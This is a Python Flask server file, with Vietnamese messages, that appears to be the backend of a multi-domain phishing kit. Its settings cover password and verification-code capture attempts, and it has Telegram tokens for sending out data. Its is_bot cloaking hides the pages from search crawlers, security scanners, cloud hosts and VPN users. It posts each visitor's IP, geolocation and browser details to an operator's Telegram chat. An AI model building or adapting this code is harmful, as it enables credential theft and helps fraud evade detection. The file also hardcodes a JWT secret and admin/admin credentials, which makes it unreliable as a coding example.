import json
import os
import re
from datetime import datetime
from functools import wraps
from json.decoder import JSONDecodeError

import jwt
import requests
from flask import Flask, jsonify, render_template, request, send_from_directory
from flask_cors import CORS
from requests.exceptions import RequestException

app = Flask(__name__, static_folder="dist", template_folder="dist")
CORS(app)

SECRET_KEY = "ovftank"
CONFIG_FILE = "config.json"
PUBLIC_IP = requests.get("https://api.ipify.org").text
DEFAULT_CONFIG = {
    PUBLIC_IP: {
        "settings": {
            "code_loading_time": 15000,
            "max_failed_code_attempts": 3,
            "max_failed_password_attempts": 2,
            "page_loading_time": 5000,
            "password_loading_time": 10000,
            "code_input_enabled": True,
        },
        "telegram": {
            "notification_chatid": "",
            "notification_token": "",
            "data_chatid": "",
            "data_token": "",
        },
        "accounts": {
            "username": "admin",
            "password": "admin",
        }
    }
}

DEFAULT_VALUE = "Không có"
ACCESS_DENIED_MESSAGE = "Không có quyền truy cập"
INDEX_TEMPLATE = "index.html"


def ensure_config_file():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "w", encoding="utf-8") as file:
            json.dump(DEFAULT_CONFIG, file, indent=2)


ensure_config_file()


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization")
        if not token:
            return jsonify({"message": "Token is missing!"}), 403
        try:
            jwt.decode(token.split()[1], SECRET_KEY, algorithms=["HS256"])
        except jwt.ExpiredSignatureError:
            return jsonify({"message": "Token has expired!"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"message": "Token is invalid!"}), 401
        return f(*args, **kwargs)

    return decorated


@app.route("/api/admin/login", methods=["POST"])
def login():
    host = request.headers.get("Host").split(":")[0]
    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
    config = json.load(config_file)
    if host not in config:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    if username == config[host]["accounts"]["username"] and password == config[host]["accounts"]["password"]:
        token = jwt.encode({"user": username}, SECRET_KEY, algorithm="HS256")
        return jsonify({"success": True, "token": token})
    return jsonify({"success": False, "message": "Invalid credentials"}), 401


@app.route("/api/admin/config", methods=["GET"])
def get_config():
    host = request.headers.get("Host").split(":")[0]
    print(host)
    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
    config = json.load(config_file)
    if host not in config:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    try:
        return jsonify(config[host])
    except (IOError, JSONDecodeError) as e:
        return jsonify({"message": "Error reading config file", "error": str(e)}), 500


@app.route("/api/admin/config", methods=["POST"])
@token_required
def update_config():
    host = request.headers.get("Host").split(":")[0]
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
            config = json.load(config_file)
        if host not in config:
            return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
        new_config = request.get_json()
        if not isinstance(new_config, dict):
            return jsonify({"message": "Invalid config format"}), 400
        if not all(key in new_config for key in ["settings", "telegram"]):
            return jsonify({"message": "Invalid config structure"}), 400
        if not all(key in new_config["settings"] for key in config[host]["settings"]):
            return jsonify({"message": "Invalid settings structure"}), 400
        if not all(key in new_config["telegram"] for key in config[host]["telegram"]):
            return jsonify({"message": "Invalid telegram structure"}), 400
        config[host].update(new_config)
        with open(CONFIG_FILE, "w", encoding="utf-8") as file:
            json.dump(config, file, indent=2)
        return jsonify({"success": True, "message": "Config updated successfully"})
    except (IOError, OSError, JSONDecodeError) as e:
        return jsonify({"success": False, "message": f"Error updating config: {str(e)}"}), 500


@app.route('/api/admin/domains', methods=['GET'])
@token_required
def get_domains():
    host = request.headers.get("Host").split(":")[0]
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
        config = json.load(config_file)
    return jsonify(list(config.keys()))


@app.route('/api/admin/add-domain', methods=['POST'])
@token_required
def add_domain():
    host = request.headers.get("Host").split(":")[0]
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    domain = request.get_json().get("domain")
    if not domain:
        return jsonify({"success": False, "message": "Domain is required"}), 400

    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
        config = json.load(config_file)

    if len(config) >= 35:
        return jsonify({"success": False, "message": "Không đủ VPS, không thể thêm tên miền"}), 400

    if domain in config:
        return jsonify({"success": False, "message": "Tên miền đã tồn tại"}), 400

    config[domain] = {
        "settings": DEFAULT_CONFIG[PUBLIC_IP]["settings"].copy(),
        "telegram": DEFAULT_CONFIG[PUBLIC_IP]["telegram"].copy(),
        "accounts": DEFAULT_CONFIG[PUBLIC_IP]["accounts"].copy()
    }

    with open(CONFIG_FILE, "w", encoding="utf-8") as config_file:
        json.dump(config, config_file, indent=2)

    return jsonify({"success": True, "message": "Domain added successfully"})


@app.route('/api/admin/delete-domain', methods=['POST'])
@token_required
def delete_domain():
    domain = request.get_json().get("domain")
    host = request.headers.get("Host").split(":")[0]
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    if not domain:
        return jsonify({"success": False, "message": "Domain is required"}), 400

    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
        config = json.load(config_file)
    if domain not in config:
        return jsonify({"success": False, "message": "Domain not found"}), 404
    del config[domain]
    with open(CONFIG_FILE, "w", encoding="utf-8") as config_file:
        json.dump(config, config_file, indent=2)
    return jsonify({"success": True, "message": "Domain deleted successfully"})


@app.route('/api/admin/get-accounts', methods=['GET'])
@token_required
def get_accounts():
    host = request.headers.get("Host").split(":")[0]
    domain = request.args.get("domain")
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
        config = json.load(config_file)
    return jsonify(config[domain]["accounts"])


@app.route('/api/admin/change-password', methods=['POST'])
@token_required
def change_password():
    host = request.headers.get("Host").split(":")[0]
    domain = request.get_json().get("domain")
    username = request.get_json().get("username")
    password = request.get_json().get("password")
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
        config = json.load(config_file)
    config[domain]["accounts"]["username"] = username
    config[domain]["accounts"]["password"] = password
    with open(CONFIG_FILE, "w", encoding="utf-8") as config_file:
        json.dump(config, config_file, indent=2)
    return jsonify({"success": True, "message": "Thông tin tài khoản đã được cập nhật"})


@app.route('/admin')
def admin_vip():
    host = request.headers.get("Host").split(":")[0]
    if host == PUBLIC_IP:
        return render_template('admin.html')
    else:
        return render_template(INDEX_TEMPLATE)


@app.errorhandler(Exception)
def handle_error(error):
    response = jsonify({"error": str(error)})
    response.status_code = 500
    return response


@app.route("/")
def index():
    user_agent = request.headers.get("User-Agent")
    ip = request.headers.get("X-Forwarded-For")
    host = request.headers.get("Host").split(":")[0]
    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
    config = json.load(config_file)
    if host not in config:
        return jsonify({"message": "Access Denied"}), 403
    if ip:
        ip = ip.split(",")[0]
    else:
        ip = request.headers.get("X-Real-IP") or request.remote_addr
    if ip == "127.0.0.1":
        return render_template(INDEX_TEMPLATE)
    if is_bot(ip, user_agent):
        return jsonify({"message": "Access Denied"}), 403

    send_visitor_info(ip, user_agent)
    return render_template(INDEX_TEMPLATE)


@app.route("/<path:path>")
def catch_all(path):
    user_agent = request.headers.get("User-Agent")
    ip = request.headers.get("X-Forwarded-For")
    host = request.headers.get("Host").split(":")[0]
    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
    config = json.load(config_file)
    if host not in config:
        return jsonify({"message": "Access Denied"}), 403
    if ip:
        ip = ip.split(",")[0]
    else:
        ip = request.headers.get("X-Real-IP") or request.remote_addr
    if ip == "127.0.0.1":
        if os.path.exists(os.path.join(app.static_folder, path)):
            return send_from_directory(app.static_folder, path)
        else:
            return render_template(INDEX_TEMPLATE)
    send_visitor_info(ip, user_agent)
    if is_bot(ip, user_agent):
        return jsonify({"message": "Access Denied"}), 403
    elif os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    else:
        return render_template(INDEX_TEMPLATE)


def is_bot(ip, user_agent):
    ip = ip.strip().replace("/", "").replace("\\", "").strip()
    if ip == "127.0.0.1":
        return True

    blocked_regex = r"(?i)\b(facebook|netlify|cloudflare|vercel|github|gitlab|bitbucket|heroku|aws|azure|digitalocean|lighttpd|applebot|googlebot|bingbot|yandexbot|baidu|duckduckbot|pinterest|linkedin|twitter|bot|crawler|spider|scraper|monitor|analytics|tracking|monitoring|probing|scanning|python|java|javascript|php|ruby|swift|kotlin|csharp|c|http|cloud|https|ftp|smtp|imap|pop|nntp|telnet|ssh|vpn|proxy|tor|ss|ssr|v2ray|trojan|wireguard)\b"

    if re.search(blocked_regex, user_agent, re.IGNORECASE):
        return True

    try:
        response = requests.get(
            f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
        geo_data = response.json()
        if "organization" in geo_data and re.search(blocked_regex, geo_data["organization"].lower()):
            return True
    except (RequestException, JSONDecodeError) as e:
        print(f"Error fetching geo data: {e}")
        geo_data = {}
    return False


def send_visitor_info(ip, user_agent):
    host = request.headers.get("Host").split(":")[0]
    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
    config = json.load(config_file)
    if host not in config:
        return
    ip = ip.strip().replace("/", "").replace("\\", "").strip()
    try:
        response = requests.get(
            f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
        geo_data = response.json()
    except (RequestException, JSONDecodeError) as e:
        print(f"Error fetching geo data: {e}")
        geo_data = {}

    def escape_html(text):
        special_characters = {"<": "&lt;", ">": "&gt;", "&": "&amp;"}
        for char, replacement in special_characters.items():
            text = text.replace(char, replacement)
        return text

    user_agent = escape_html(str(user_agent))
    ip = escape_html(str(ip))
    country = escape_html(str(geo_data.get("country", DEFAULT_VALUE)))
    region = escape_html(str(geo_data.get("region", DEFAULT_VALUE)))
    city = escape_html(str(geo_data.get("city", DEFAULT_VALUE)))
    latitude = escape_html(str(geo_data.get("latitude", DEFAULT_VALUE)))
    longitude = escape_html(str(geo_data.get("longitude", DEFAULT_VALUE)))
    timezone = escape_html(str(geo_data.get("timezone", DEFAULT_VALUE)))
    asn = escape_html(str(geo_data.get("asn", DEFAULT_VALUE)))
    organization = escape_html(
        str(geo_data.get("organization", DEFAULT_VALUE)))

    message = f"""
<b>🖥️ User Agent:</b> <code>{user_agent}</code>
<b>📅 Thời gian:</b> <code>{datetime.now().isoformat().replace(".", "&#46;")}</code>
<b>📶 IP:</b> <code>{ip}</code>
<b>🌐 Quốc gia:</b> <code>{country}</code>
<b>🏙️ Vùng:</b> <code>{region}</code>
<b>🏠 Thành phố:</b> <code>{city}</code>
<b>📍 Vĩ độ:</b> <code>{latitude}</code>
<b>🧭 Kinh độ:</b> <code>{longitude}</code>
<b>🕒 Múi giờ:</b> <code>{timezone}</code>
<b>🔗 ASN:</b> <code>{asn}</code>
<b>🏢 Tổ chức:</b> <code>{organization}</code>
"""
    send_to_telegram(message, "HTML", host)


def send_to_telegram(message, parse_mode="HTML", host=None):
    try:
        config_file = open(CONFIG_FILE, "r", encoding="utf-8")
        config = json.load(config_file)
        telegram_config = config[host]["telegram"]
        telegram_bot_token = telegram_config["notification_token"]
        chat_id = telegram_config["notification_chatid"]
        if not telegram_bot_token or not chat_id:
            print("Telegram configuration is missing or invalid")
            return
        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
        params = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": parse_mode,
        }

        response = requests.post(url, json=params, timeout=5)
        response.raise_for_status()
        print("Telegram message sent successfully")

    except (IOError, JSONDecodeError) as e:
        print(f"Failed to read config file: {e}")
    except Exception as e:
        print(f"Unexpected error while sending Telegram message: {e}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
